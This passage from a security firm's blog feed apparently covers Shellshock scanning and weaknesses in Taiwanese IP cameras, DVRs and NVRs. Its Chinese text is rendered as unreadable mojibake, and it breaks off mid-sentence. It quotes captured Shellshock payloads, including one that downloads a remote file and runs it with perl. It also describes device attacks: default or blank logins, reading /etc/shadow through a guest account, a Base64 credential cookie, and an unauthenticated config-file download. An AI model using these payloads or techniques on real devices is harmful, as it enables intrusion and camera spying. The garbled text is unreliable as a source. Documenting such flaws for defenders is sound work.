&lt;p&gt;ç¾åœ¨é‡å° HTTP ä¼ºæœå™¨çš„æ”»æ“Šé‚„æ˜¯ä½”å¤šæ•¸ï¼Œæˆªè‡³ç›®å‰ç‚ºæ­¢æˆ‘å€‘ä»æŒçºŒç™¼ç¾ç¶²è·¯ä¸Šæœ‰å„ç¨®æƒææ¨£æœ¬ï¼Œä¾‹å¦‚ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;() { :;}; /bin/bash -c &quot;echo testing9123123&quot;; /bin/uname -a&lt;/li&gt;
  &lt;li&gt;() { :;}; /bin/bash -c &quot;wget -P /var/tmp 174.143.2XX.XX/â€¦/x ; perl /var/tmp/x&quot;&lt;/li&gt;
  &lt;li&gt;() { :;};echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF$(echo vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF)vOLniO4dcLqW2I3MnIVpSfk8bmzyxXaIF&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é™¤äº†é€™äº›é™¸çºŒé‡å° HTTP ä¼ºæœå™¨çš„æ¡ˆä¾‹ï¼Œæˆ‘å€‘èªç‚ºï¼Œä¸€äº›å…¬å¸è³¼å…¥çš„ç¶²è·¯è¨­å‚™æ˜¯ Shellshock æ½›åœ¨é«˜å±éšªç¾¤ï¼Œé‚£äº›è²·ä¾†å°±æ“ºåœ¨æ—é‚Šç¶­é‹çš„è¨­å‚™ï¼Œä¸€ä¾†å®¹æ˜“è¢«å¿½ç•¥ï¼ŒäºŒä¾†æ˜¯å…¶æ›´æ–°ä¸æ˜“ï¼Œä¸‰ä¾†é€™äº›è¨­å‚™å¸¸ä½¿ç”¨åˆ° bashï¼Œå› æ­¤ä»æ˜¯ç¾åœ¨æƒ¡æ„æ”»æ“Šè€…å°ˆæ³¨ç ”ç©¶çš„ç›®æ¨™ï¼Œè«‹å¤§å®¶ç‰¹åˆ¥å°å¿ƒã€‚&lt;/p&gt;

&lt;h3 id=&quot;çµè«–ç„¡éœ€éåº¦ææ…Œä½†åˆ¥æ‰ä»¥è¼•å¿ƒ&quot;&gt;çµè«–ï¼šç„¡éœ€éåº¦ææ…Œï¼Œä½†åˆ¥æ‰ä»¥è¼•å¿ƒ&lt;/h3&gt;

&lt;p&gt;ã€Œåªè¦æœ‰ bash çš„ç³»çµ±å…¨éƒ¨éƒ½æ˜¯å—é§­ç¯„åœï¼ã€&lt;/p&gt;

&lt;p&gt;ä¸å°‘æœ‹å‹çœ‹åˆ°æœ€è¿‘ Shellshock çš„æ–°èå ±å°ï¼Œéƒ½ååˆ†ç·Šå¼µã€‚å„˜ç®¡å„ä½æ‰€ä½¿ç”¨çš„ bash æ˜¯å«æœ‰æ¼æ´çš„ç‰ˆæœ¬ï¼Œä½†è¦æˆåŠŸåŸ·è¡Œæ”»æ“Šæ‰‹æ³•éœ€è¦è¨±å¤šæ¢ä»¶ï¼Œè¢«æ”»æ“Šè€…å¾é ç«¯æ”»æ“Šçš„æ©Ÿç‡åä½ï¼Œå› æ­¤å¤§å®¶ä¸éœ€è¦å¤ªéææ…Œï¼Œåªè¦æ³¨æ„ä»¥ä¸‹è¨­å‚™æˆ–ä¼ºæœå™¨ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;ç‰¹å®š Linux ç‰ˆæœ¬ï¼Œä¸¦ä¸”ä½¿ç”¨ DHCP é€£ç·š&lt;/li&gt;
  &lt;li&gt;ç¶²è·¯ã€è³‡å®‰è¨­å‚™&lt;/li&gt;
  &lt;li&gt;ä½¿ç”¨ CGI çš„ç¶²ç«™ä¼ºæœå™¨&lt;/li&gt;
  &lt;li&gt;å·²ç¶“å…¬å¸ƒå«æœ‰å¼±é»çš„å¥—ä»¶&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;é‚£æˆ‘å€‘è©²æ€éº¼è‡ªä¿å‘¢ï¼Ÿåœ¨æ”»æ“Šæ‰‹æ³•ä¸æ–·ç²¾é€²ä¹‹ä¸‹ï¼Œåªéæ¿¾ CVE-2014-6271 çš„æ”»æ“Šå­—ä¸²ä¸¦æ²’æœ‰è¾¦æ³•å®Œå…¨é˜»æ“‹æ”»æ“Šã€‚å»ºè­°å¯ä»¥å…ˆå°‡ä¼ºæœå™¨çš„ bash å‡ç´šè‡³æœ€æ–°ç‰ˆæœ¬ï¼Œä¸¦æŒçºŒé—œæ³¨å¾ŒçºŒæ›´æ–°è¨Šæ¯ï¼ˆç›®å‰æŒçºŒæœ‰ç¹éæª¢æŸ¥çš„æ–° CVE å¼±é»ç™¼ä½ˆï¼‰ï¼Œä½¿ç”¨ CGI ä¹‹ä¼ºæœå™¨æ­é… iptablesã€IDSã€Mod Security ç­‰æ©Ÿåˆ¶åµæ¸¬æ”»æ“Šç‰¹å¾µä¸¦å°‡å…¶é˜»æ“‹ã€‚è‹¥æœ‰è¨­å‚™åœ¨é€™æ¬¡çš„å½±éŸ¿ç¯„åœï¼Œä¹Ÿè¨˜å¾—å‘åŸå» ç´¢å–æ›´æ–°ç¨‹å¼ã€‚&lt;/p&gt;

&lt;h3 id=&quot;é¡Œå¤–è©±&quot;&gt;é¡Œå¤–è©±&lt;/h3&gt;

&lt;p&gt;æœ‰äººèªªï¼šã€ŒLinux åœ¨ 2014 å¹´æ¥é€£å‡ºåŒ…ï¼ŒçœŸæ˜¯ä¸€å€‹ä¸å®‰å…¨çš„ä½œæ¥­ç³»çµ±ï¼åè§€ Windows åœ¨é€™å¹¾æ¬¡éƒ½æ¯«ç„¡å½±éŸ¿ï¼Œä¼æ¥­æ‡‰è©²è¦å…¨é¢æ”¹ç”¨ Microsoft Solutionï¼ã€ï¼Œä½†é€™çœŸçš„æ˜¯æ­£ç¢ºçš„æƒ³æ³•å—ï¼Ÿå…¶å¯¦ä¸€å€‹ OpenSource çš„ç³»çµ±ã€è»Ÿé«”ï¼Œå¯ä»¥è—‰ç”±ç¤¾ç¾¤çš„åŠ›é‡æª¢è¦–åŸå§‹ç¢¼çš„å•é¡Œï¼Œé›†åˆçœ¾äººçš„åŠ›é‡è®“ç³»çµ±è®Šå¾—æ›´åŠ å®‰å…¨ã€‚å› æ­¤æœ‰è¢«æ­éœ²å‡ºæ¼æ´ï¼Œå°æ–¼ä¸€å€‹ç³»çµ±ä¾†èªªæ˜¯å¥½äº‹ã€‚è€Œé OpenSource çš„ç³»çµ±ï¼Œå°±åªèƒ½ä»°è³´åŸå» è‡ªå·±çš„è³‡å®‰åœ˜éšŠé€²è¡Œç ”ç©¶ï¼Œæˆ–è€…æ˜¯å¤–éƒ¨è³‡å®‰äººå“¡çš„ç™¼æ˜äº†ã€‚é¸æ“‡ä½œæ¥­ç³»çµ±çš„åŸå‰‡ï¼Œæœ€å¥½ä¾ç…§ç³»çµ±çš„åŠŸèƒ½éœ€æ±‚ã€ç”¢å“å®šä½ã€å®‰å…¨æ¼æ´çš„ä¿®è£œé€Ÿåº¦ç­‰å±¤é¢ï¼Œæ‰èƒ½å¤ é¸ç”¨çœŸæ­£ç¬¦åˆè‡ªå·±éœ€è¦çš„ç³»çµ±ã€‚&lt;/p&gt;

&lt;h3 id=&quot;è¨»è§£&quot;&gt;è¨»è§£&lt;/h3&gt;

&lt;div class=&quot;footnotes&quot; role=&quot;doc-endnotes&quot;&gt;
  &lt;ol&gt;
    &lt;li id=&quot;fn:note2&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;è‹¥æ‰‹å‹•åŸ·è¡Œ dhclientï¼Œå‰‡æœƒé­åˆ°æ¼æ´å½±éŸ¿ã€‚Â &lt;a href=&quot;#fnref:note2&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;Â &lt;a href=&quot;#fnref:note2:1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;sup&gt;2&lt;/sup&gt;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
    &lt;li id=&quot;fn:note1&quot; role=&quot;doc-endnote&quot;&gt;
      &lt;p&gt;ç³»çµ±ç’°å¢ƒè®Šæ•¸æœƒå—åˆ°å½±éŸ¿ï¼Œä½†ç„¡æ³•è¢«æ”»æ“Šè€…åˆ©ç”¨ã€‚Â &lt;a href=&quot;#fnref:note1&quot; class=&quot;reversefootnote&quot; role=&quot;doc-backlink&quot;&gt;&amp;#8617;&lt;/a&gt;&lt;/p&gt;
    &lt;/li&gt;
  &lt;/ol&gt;
&lt;/div&gt;
</description>
                <link>https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271/</link>
                <guid>https://devco.re/blog/2014/09/30/shellshock-CVE-2014-6271</guid>
                <pubDate>Tue, 30 Sep 2014 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR çš„è³‡å®‰è­°é¡Œ - ä½ çŸ¥é“æˆ‘åœ¨çœ‹ä½ å—ï¼Ÿ</title>
                <description>&lt;p&gt;ç¶²è·¯æ”å½±æ©Ÿçš„æ™®åŠç‡åœ¨è¿‘å¹¾å¹´ä¾†æŒçºŒæ”€å‡ï¼Œé™¤äº†è€äººèˆ‡å¹¼å…’å±…å®¶ç…§è­·ã€ä¼æ¥­å®¤å…§ç›£æ§ç­‰éœ€æ±‚è¿…é€Ÿå¢åŠ ä¹‹å¤–ï¼Œçµåˆæ‰‹æ©Ÿæ‡‰ç”¨ç¨‹å¼è®“äººå¯éš¨æ™‚éš¨åœ°è§€çœ‹å½±åƒçš„æ–¹ä¾¿æ€§ä¹Ÿæˆç‚ºæ™®åŠçš„åŸå› ã€‚ç•¶å¤§å®¶é‚„ä»¥ç‚ºé»‘å¸½é§­å®¢çš„ç›®æ¨™ä»ç„¶æ˜¯ç¶²ç«™ã€å€‹äººé›»è…¦æ™‚ï¼Œå·²ç¶“æœ‰è¨±å¤šæ”»æ“Šè€…æ‚„æ‚„åœ°å°‡ç›®æ¨™è½‰å‘äº†å„ç¨®ç‰©é€£ç¶²è¨­å‚™ï¼Œä¾‹å¦‚ NASã€Wireless APã€Printer ç­‰ç”¢å“ï¼Œè€Œæ“æœ‰çœ¾å¤šç”¨æˆ¶çš„ç¶²è·¯æ”å½±æ©Ÿç†æ‰€ç•¶ç„¶åœ°ä¹Ÿæ˜¯ç›®æ¨™ä¹‹ä¸€ã€‚èº«ç‚ºå®‰æ§ç”¢å“ï¼Œå»é€ æˆä¸€é …è³‡å®‰çš„éš±æ†‚ï¼Œæ˜¯ä¸æ˜¯æœ‰é»è«·åˆºå‘¢ï¼Ÿ&lt;/p&gt;

&lt;p&gt;æ°å¥½æœ€è¿‘å¹¾å¤©å¿½ç„¶çœ‹åˆ°æœ‰æ–°èå ±å°&lt;a href=&quot;http://news.ltn.com.tw/news/world/breakingnews/1112329&quot;&gt;ã€Œå®¶ç”¨ç›£è¦–å™¨é­é§­å®¢å…¥ä¾µ éš±ç§å…¨è¢«çœ‹å…‰å…‰ã€&lt;/a&gt;é€™æ¨£å­çš„æ¡ˆä¾‹ï¼Œè€Œåœ¨å»å¹´ä¹Ÿæœ‰é¡ä¼¼çš„å ±å°&lt;a href=&quot;http://news.networkmagazine.com.tw/classification/security/2013/06/18/51531/&quot;&gt;ã€Œæ•¸åè¬æ”¯ç›£æ§æ”å½±æ©Ÿæ½›è—è¢«é§­æ¼æ´ é›»å½±æƒ…æ™¯æçœŸå¯¦ä¸Šæ¼”ã€&lt;/a&gt;ï¼Œè®“æˆ‘å€‘ä¸ç¦æƒ³å°é€™å€‹äº‹ä»¶åšå€‹æ·±å…¥çš„èª¿æŸ¥ã€‚å°±è®“æˆ‘å€‘ä¾†çœ‹çœ‹ç¶²è·¯æ”å½±æ©Ÿä»¥åŠç›¸é—œç”¢å“ç©¶ç«Ÿæœ‰å“ªäº›é¢¨éšªå§ï¼&lt;/p&gt;

&lt;!-- more --&gt;

&lt;h3 id=&quot;cve&quot;&gt;CVE&lt;/h3&gt;

&lt;p&gt;æˆ‘å€‘å…ˆä¾†çœ‹çœ‹å¹¾å€‹å¤§å» åœ¨ 2013 å¹´åˆ° 2014 å¹´ä¹‹é–“æœ‰å“ªäº›å·²ç¶“è¢«å…¬é–‹æ­éœ²çš„ CVE å¼±é»ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;AVTECH: 3, CVE-2013-4980, CVE-2013-4981, CVE-2013-4982&lt;/li&gt;
  &lt;li&gt;AXIS: 2, CVE-2013-3543, CVE-2011-5261&lt;/li&gt;
  &lt;li&gt;Hikvision: 3, CVE-2013-4975, CVE-2013-4976, CVE-2013-4977&lt;/li&gt;
  &lt;li&gt;SONY: 1, CVE-2013-3539&lt;/li&gt;
  &lt;li&gt;Vivotek: 6, CVE-2013-1594, CVE-2013-1595, CVE-2013-1596, CVE-2013-1597, CVE-2013-1598, CVE-2013-4985&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;è®€è€…å€‘è‹¥é€²ä¸€æ­¥å»çœ‹å„å€‹ CVE çš„è©³ç´°è³‡æ–™ï¼Œæœƒç™¼ç¾æœ‰è¨±å¤šå¼±é»éƒ½æ˜¯å±¬æ–¼å¯åŸ·è¡Œä»»æ„æŒ‡ä»¤çš„åš´é‡æ¼æ´ï¼Œå…¶å½±éŸ¿ç¨‹åº¦éå¸¸é«˜ï¼Œå·²ä¸åªæ˜¯é—œæ–¼æ”å½±å…§å®¹æ˜¯å¦è¢«ç«Šå–ï¼Œæ›´æœ‰å¯èƒ½è¢«åˆ©ç”¨æ­¤é¡è¨­å‚™é€²ä¸€æ­¥æ”»æ“Šå…¶ä»–å…§ã€å¤–ç¶²æ©Ÿå™¨ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å°ç£ç¾æ³&quot;&gt;å°ç£ç¾æ³&lt;/h3&gt;

&lt;p&gt;é›–ç„¶ä¸Šé¢æåˆ°è¨±å¤šçŸ¥åå» ç‰Œçš„åš´é‡æ¼æ´ï¼Œä½†æ˜¯æ¯å€‹åœ‹å®¶ä½¿ç”¨çš„å®‰æ§è¨­å‚™ä¸è¦‹å¾—éƒ½æ˜¯ä¸Šè¿°å¹¾å€‹ç‰Œå­ï¼Œè€Œèº«ç‚ºè³‡å®‰æ¥­è€…ï¼Œéš¨æ™‚é—œæ³¨è‡ªå·±åœ‹å®¶çš„ç¶²è·¯ç¾æ³ä¹Ÿæ˜¯å¾ˆåˆç†çš„äº‹æƒ…ï½åœ¨æˆ‘å€‘çš„å¤§é‡è§€æ¸¬ä¸‹ï¼Œç™¼ç¾æœ‰è¨±å¤š IP Cameraã€&lt;a href=&quot;http://en.wikipedia.org/wiki/Digital_video_recorder&quot;&gt;DVR (Digital Video Recoder)&lt;/a&gt;ã€&lt;a href=&quot;http://en.wikipedia.org/wiki/Network_Video_Recorder&quot;&gt;NVR (Network Video Recoder)&lt;/a&gt; éƒ½å­˜åœ¨è³‡å®‰è­°é¡Œï¼Œæˆ‘å€‘å¾å…¶ä¸­æå‡ºå¹¾å€‹æœ‰è¶£çš„æ¡ˆä¾‹è·Ÿå„ä½åˆ†äº«ä¸€ä¸‹ï¼š&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;æŸåœ‹å¤– V ç‰Œå» å•† ï¼ˆæ•¸é‡ï¼š320+ï¼‰&lt;/p&gt;

    &lt;p&gt;ä¸€èˆ¬çš„ç”¢å“é€šå¸¸éƒ½æœƒæœ‰é è¨­å¸³è™Ÿå¯†ç¢¼ï¼Œä½†é€™é–“å» å•†çš„ç”¢å“ä¼¼ä¹æ²’æœ‰é è¨­å¸³è™Ÿå¯†ç¢¼ï¼Œè‹¥ä½¿ç”¨è€…æœªè¨­å®šå¸³è™Ÿå¯†ç¢¼ï¼Œæ”»æ“Šè€…åªè¦ç›´æ¥é»ã€ŒOKã€æŒ‰éˆ•å°±å¯ä»¥ç™»å…¥ç³»çµ±ï¼Œè€Œé€™æ¨£å­çš„ DVR åœ¨å°ç£æœ‰ä¸‰ç™¾å¤šå°ï¼Œä¹Ÿå°±æ˜¯æœ‰ä¸‰ç™¾å¤šå° DVR åœ¨ç¶²è·¯ä¸Šè£¸å¥”â€¦&lt;a href=&quot;/assets/img/blog/20140924/case_study_01.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_01.png&quot; alt=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 1&quot; title=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 1&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æŸåœ‹å¤– H ç‰Œå» å•† ï¼ˆæ•¸é‡ï¼š1200+ï¼‰&lt;/p&gt;

    &lt;p&gt;æœ‰äº›å» å•†ç‚ºäº†æ–¹ä¾¿ç¶­ä¿®æˆ–è€…å…¶ä»–ç†ç”±ï¼Œæœƒåœ¨ NVR ä¸Šé–‹å•Ÿäº† Telnet æœå‹™ï¼Œé›–ç„¶å¢åŠ äº†è¢«æ”»æ“Šçš„æ©Ÿç‡ï¼Œä½†æ˜¯è‹¥å¯†ç¢¼å¼·åº¦è¶³å¤ ä¸”æ²’æœ‰å¤–æµï¼Œä¹Ÿä¸æœƒéš¨ä¾¿è¢«æ‰“é€²å»ã€‚è€Œé€™é–“å» å•†éå¸¸æœ‰è¶£ï¼Œé™¤äº† root å¸³è™Ÿä¹‹å¤–é‚„æœ‰ä¸€çµ„ guest å¸³è™Ÿï¼Œä¸¦ä¸” guest çš„å¯†ç¢¼éå¸¸ç°¡å–®ï¼ŒåŠ ä¸Šç•¶åˆå»ºç½®ç³»çµ±æ™‚ä¸¦æœªæª¢æŸ¥æ©Ÿæ•æª”æ¡ˆçš„æ¬Šé™æ˜¯å¦è¨­å®šéŒ¯èª¤ï¼Œå°è‡´æ”»æ“Šè€…å¯å…ˆç”¨ guest å¸³è™Ÿç™»å…¥ï¼Œå†å» /etc/shadow è®€å– root å¯†ç¢¼åŠ ä»¥ç ´è§£ï¼Œé€²ä¸€æ­¥å–å¾—è¨­å‚™æ‰€æœ‰æ¬Šé™ã€‚&lt;a href=&quot;/assets/img/blog/20140924/case_study_02.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_02.png&quot; alt=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 2&quot; title=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 2&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æŸåœ‹å¤– D ç‰Œå» å•† ï¼ˆæ•¸é‡ï¼š700+ï¼‰&lt;/p&gt;

    &lt;p&gt;é€™å€‹æ¡ˆä¾‹å¯¦åœ¨æ˜¯ä»¤äººå“­ç¬‘ä¸å¾—ï¼Œä¸çŸ¥é“æ˜¯åŸå» é‚„æ˜¯å°ç£ä»£ç†å•†éå¸¸å¥½å¿ƒåœ°å¹«ä½¿ç”¨è€…å»ºç«‹äº†å¤šçµ„é è¨­å¸³è™Ÿï¼ŒåŒ…å« adminã€666666ã€888888 ç­‰ç­‰ï¼Œè€Œä¸”å¯†ç¢¼ä¹Ÿè¨­å®šå¾—å¾ˆç°¡å–®ã€‚ä½†æ˜¯é€šå¸¸è¦ä½¿ç”¨è€…è¨˜å¾—æ”¹ä¸€çµ„é è¨­å¯†ç¢¼å·²ç¶“éå¸¸å›°é›£ï¼Œæ›´ä½•æ³æ˜¯è¦ä½¿ç”¨è€…æ”¹ä¸‰çµ„å¯†ç¢¼å‘¢ï¼Ÿé€™ç¨®æƒ…å½¢å°è‡´æ”»æ“Šè€…å¯ä»¥è¼•è€Œæ˜“èˆ‰åœ°æ‹¿è‘—å¼±å¯†ç¢¼åˆ°è™•çŒœï¼Œå¤§å¤§æé«˜äº†ç”¨æˆ¶çš„å—å®³æ©Ÿç‡ã€‚è€Œæ›´æœ‰è¶£çš„æ˜¯ï¼Œä¸çŸ¥é“æ˜¯åŸºæ–¼æ­·å²åŒ…è¢±æˆ–è€…å…¶ä»–åŸå› ï¼Œæ­¤è¨­å‚™é–‹äº†ç‰¹æ®Šçš„ portï¼Œç›´æ¥é€å‡ºå«æœ‰ç‰¹å®šå…§å®¹çš„å°åŒ…åˆ°é€™å€‹ port å°±å¯ä»¥åŸ·è¡Œç›¸å°æ‡‰çš„æŒ‡ä»¤ï¼Œä¾‹å¦‚å¯ä»¥å–å¾—å¸³è™Ÿå¯†ç¢¼ã€ä½¿ç”¨è€… email ç­‰ç­‰ï¼Œè€Œåœ¨é€™å€‹éç¨‹ä¸­å®Œå…¨æ²’æœ‰ä»»ä½•èªè­‰æ©Ÿåˆ¶ï¼ç­‰æ–¼åˆæœ‰ä¸ƒç™¾å¤šå° NVR åœ¨ç¶²è·¯ä¸Šè£¸å¥”â€¦&lt;a href=&quot;/assets/img/blog/20140924/case_study_03.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_03.png&quot; alt=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 3&quot; title=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 3&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æŸåœ‹å…§ A ç‰Œå» å•† ï¼ˆæ•¸é‡ï¼š1000+ï¼‰&lt;/p&gt;

    &lt;p&gt;é€™é–“å» å•†ä¹Ÿæ˜¯ä½¿ç”¨å¸¸è¦‹çš„é è¨­å¸³è™Ÿå¯†ç¢¼ï¼Œä½†å®ƒå¯æ€•çš„åœ°æ–¹é‚„ä¸æ­¢æ–¼æ­¤ã€‚è©²ç³»çµ±å°‡å¸³è™Ÿå¯†ç¢¼è½‰ç‚º Base64 ç·¨ç¢¼å¾Œç›´æ¥ç•¶ä½œ cookie å…§å®¹ï¼Œå› æ­¤è‹¥é è¨­å¸³è™Ÿå¯†ç¢¼åˆ†åˆ¥æ˜¯ abc èˆ‡ 123ï¼Œå°‡ abc:123 ç”¨ Base64 ç·¨ç¢¼éå¾Œå¯å¾—åˆ° YWJjOjEyMw==ï¼Œæ¥è‘—å°‡ Cookie: SSID=YWJjOjEyMw== é€™ä¸²å…§å®¹åŠ åˆ° request çš„ HTTP header ä¸­ï¼Œå°±å¯ä»¥åˆ°è™•æ¸¬è©¦è©²è¨­å‚™æ˜¯å¦ä½¿ç”¨é è¨­å¸³è™Ÿå¯†ç¢¼ï¼Œç”šè‡³é‚„å¯ä»¥é€²ä¸€æ­¥ä¸‹è¼‰å‚™ä»½æª”ï¼Œå¯Ÿçœ‹ä½¿ç”¨è€…æœ‰ç„¡å¡«å¯« emailã€ç¶²è·¯å¸³è™Ÿå¯†ç¢¼ç­‰è³‡æ–™ã€‚&lt;a href=&quot;/assets/img/blog/20140924/case_study_04.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_04.png&quot; alt=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 4&quot; title=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 4&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;æŸåœ‹å…§ A ç‰Œå» å•†ï¼ˆæ•¸é‡ï¼š10+ï¼‰&lt;/p&gt;

    &lt;p&gt;é€™å€‹æ¡ˆä¾‹é›–ç„¶æ•¸é‡éå¸¸å°‘ï¼Œä½†æ˜¯å»éå¸¸åš´é‡ã€‚ç‚ºä»€éº¼å‘¢ï¼Ÿå› ç‚ºå» å•†æ²’æœ‰å°æ©Ÿæ•è³‡æ–™åšåš´æ ¼çš„æ¬Šé™æ§ç®¡ï¼Œåªè¦æ”»æ“Šè€…ç›´æ¥åœ¨ç¶²å€åˆ—è¼¸å…¥ http://IP/sys.binï¼Œå°±å¯ä»¥ç›´æ¥ä¸‹è¼‰ä¸€å€‹åç‚º sys.bin çš„æª”æ¡ˆï¼Œè€Œæ­¤æª”æ¡ˆæ˜¯ tgz æ ¼å¼ï¼Œè§£å£“ç¸®å¾Œå¯ä»¥å¾—åˆ° system_server.confï¼Œè©²æª”æ¡ˆä¸­å«æœ‰å¸³è™Ÿã€å¯†ç¢¼ï¼Œå› æ­¤å³ä¾¿ä½¿ç”¨è€…ä¿®æ”¹äº†é è¨­å¸³è™Ÿå¯†ç¢¼ï¼Œä¹Ÿæœƒå› ç‚ºé€™å€‹åš´é‡æ¼æ´è€Œè¼•æ˜“åœ°è¢«å…¥ä¾µã€‚&lt;a href=&quot;/assets/img/blog/20140924/case_study_05.png&quot;&gt;&lt;img src=&quot;/assets/img/blog/20140924/case_study_05.png&quot; alt=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 5&quot; title=&quot;ç¶²è·¯æ”å½±æ©Ÿã€DVRã€NVR æ¡ˆä¾‹ 5&quot; /&gt;&lt;/a&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;XXXXç§‘æŠ€ ï¼ˆæ•¸é‡ï¼š230+ï¼‰&lt;/p&gt;

    &lt;p&gt;é€™æ˜¯ä¸€å€‹éå¸¸ç¶“å…¸çš„æ¡ˆä¾‹ï¼ä¸€èˆ¬æ”»æ“Šè€…å…¥ä¾µæ”å½±æ©Ÿæœ€å¸¸è¦‹çš„å°±æ˜¯ç‚ºäº†å·çœ‹æ”å½±æ©Ÿç•«é¢ï¼Œå†é€²éšä¸€é»çš„å¯èƒ½æœƒæ§åˆ¶è©²æ”å½±æ©Ÿé€²ä¸€æ­¥æ”»æ“Šå…§ç¶²ã€‚è€Œé€™å®¶å» å•†èº«ç‚ºçŸ¥åä¿å…¨å…¬å¸æŠ•è³‡æˆç«‹çš„å®‰æ§å…¬å¸ï¼Œç†ç•¶ç‚ºå®¢æˆ¶çš„ç›£æ§ç•«é¢åšæœ€å‘¨å…¨çš„è¦åŠƒã€æœ€è¬¹æ…çš„é˜²è­·ï¼Œä½†æ˜¯çµæœå‘¢ï¼Ÿå ±å‘Šå„ä½ï¼Œå®Œå…¨æ²’æœ‰ä»»ä½•é˜²è­·ï¼åªè¦é€£åˆ° IP ä½å€å°±å¯ä»¥ç›´æ¥çœ‹åˆ°æ”å½±æ©Ÿç•«é¢ï¼Œä¹Ÿæ˜¯å±¬æ–¼è£¸å¥”ä¸€æ—â€¦&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;å¾é€™å¹¾å€‹æ¡ˆä¾‹æˆ‘å€‘å¯ä»¥ç™¼ç¾å°ç£ç›®å‰è‡³å°‘æœ‰ 3500 å°å·¦å³çš„å®‰æ§è¨­å‚™è™•æ–¼é«˜é¢¨éšªç‹€æ…‹ä¸­ï¼Œè€Œç”±æ–¼æˆ‘å€‘ç„¡æš‡å°æ¯ä¸€æ¬¾è¨­å‚™é€²è¡Œèª¿æŸ¥ï¼Œå› æ­¤é€™åƒ…åƒ…æ˜¯ä¸€å€‹æ¦‚ç•¥çš„èª¿æŸ¥çµæœã€‚åŒæ™‚é€™äº›è¨­å‚™éƒ½æ˜¯åœ¨ç¶²è·¯ä¸Šå¯ç›´æ¥é€£ç·šçš„ï¼Œè‹¥å†åŠ ä¸Šå„å€‹å…¬å®¶æ©Ÿé—œã€è¾¦å…¬å¤§æ¨“ã€ç¤¾å€çš„å…§ç¶²å®‰æ§è¨­å‚™ï¼Œææ€•æœƒæœ‰æ›´é©šäººçš„ç™¼ç¾ã€‚&lt;/p&gt;

&lt;h3 id=&quot;å•é¡Œèµ·æº&quot;&gt;å•é¡Œèµ·æº&lt;/h3&gt;

&lt;p&gt;ç©¶ç«Ÿç‚ºä»€éº¼æœƒæœ‰é€™éº¼å¤šå®‰æ§è¨­å‚™è¢«å…¥ä¾µå‘¢ï¼Ÿå…¶å¯¦ä¸»è¦æœ‰å…©å€‹é¢å‘ã€‚ç¬¬ä¸€å€‹æ˜¯ç”±æ–¼è¨±å¤šå» å•†çš„é˜²ç¯„è§€å¿µä»åœç•™åœ¨èˆŠæ™‚ä»£ï¼Œä¸äº†è§£é§­å®¢åˆ°åº•éƒ½æ€éº¼æ”»æ“Šï¼Œå› æ­¤ä¹Ÿä¸äº†è§£ç¢ºåˆ‡çš„é˜²æ²»æ–¹æ³•ã€‚èˆ‰ä¾‹ä¾†èªªï¼Œå» å•†åœ¨ç¶²è·¯å®‰æ§ç³»çµ±çš„ Web è¼¸å…¥ä»‹é¢éƒ½æœƒè¨­å®šè¨±å¤šé˜»æ“‹è¦å‰‡ï¼Œä»¥é˜²ç¯„å…¥ä¾µè€…è¼¸å…¥æƒ¡æ„æ”»æ“ŠæŒ‡ä»¤ï¼Œä½†æ˜¯é€™äº›é˜²æ²»æ‰‹æ®µéƒ½åƒ…åƒ…åšåœ¨ client ç«¯ï¼ˆç”¨ JavaScript ä¾†é˜²è­·ï¼‰ï¼Œå…¥ä¾µè€…åªè¦åˆ©ç”¨ proxy å·¥å…·æˆ–è‡ªè¡Œå¯«ç¨‹å¼ç™¼é€å®¢è£½åŒ– request å°±å¯ä»¥ç¹éé‚£äº›é©—è­‰ï¼Œè‹¥å» å•†æ²’æœ‰åœ¨ server 